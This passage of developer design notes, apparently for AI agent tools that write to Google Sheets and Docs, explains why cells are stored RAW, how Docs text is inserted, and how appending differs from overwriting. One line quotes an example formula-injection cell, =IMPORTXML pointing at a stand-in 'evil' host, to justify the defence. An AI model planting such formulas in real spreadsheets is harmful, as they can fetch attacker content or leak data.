...
- **Always `RAW`, never `USER_ENTERED`.** Agent-supplied content is untrusted, and
  `USER_ENTERED` would evaluate a cell like `=IMPORTXML("http://evil/", …)` as a
  live formula (CSV/formula injection). `RAW` stores every string literally.
  `coerceCell()` still converts plain numbers to real numbers, while a strict
  pattern keeps leading-zero strings (IDs, zip codes, phone numbers) as text.
- **Docs has no append.** You insert at an index. The body's final position is the
  newline that closes it, so text must go at `endIndex - 1` — inserting at
...
- **Append vs overwrite is a real distinction.** `drive-appendSheetRows` uses
  ...
  nothing is clobbered. `drive-updateSheetRange` is the destructive one; the tool
  descriptions steer the model between them.
